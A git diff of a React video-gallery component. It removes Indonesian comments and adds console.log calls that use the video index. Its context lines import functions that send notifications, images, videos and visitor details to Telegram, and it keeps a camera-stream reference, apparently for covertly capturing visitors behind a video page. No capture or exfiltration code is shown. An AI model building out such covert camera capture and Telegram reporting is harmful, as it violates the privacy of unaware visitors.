@@ -3,9 +3,9 @@ import { useState, useEffect, useCallback, useRef } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 
 function App() {
-  const [isPlaying, setIsPlaying] = useState<number | null>(null); // Index video yang sedang diputar
+  const [isPlaying, setIsPlaying] = useState<number | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
-  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]); // Array ref untuk semua video
+  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamRef = useRef<MediaStream | null>(null);
 
   const videos = [
@@ -123,12 +123,11 @@ function App() {
   }, []);
 
   const handleVideoClick = async (index: number) => {
-    // Hentikan video yang sedang diputar sebelumnya
     if (isPlaying !== null && isPlaying !== index) {
       const prevVideo = videoRefs.current[isPlaying];
       if (prevVideo) {
         prevVideo.pause();
-        prevVideo.currentTime = 0; // Reset ke awal
+        prevVideo.currentTime = 0;
       }
     }
 
@@ -155,11 +154,13 @@ function App() {
         document.exitFullscreen();
         setIsFullscreen(false);
       }
+      console.log(`Toggled fullscreen for video at index: ${index}`); // Pastikan index digunakan
     }
   };
 
   const handleVideoEnded = (index: number) => {
     setIsPlaying(null);
+    console.log(`Video at index ${index} has ended`); // Pastikan index digunakan
   };
 
   return (
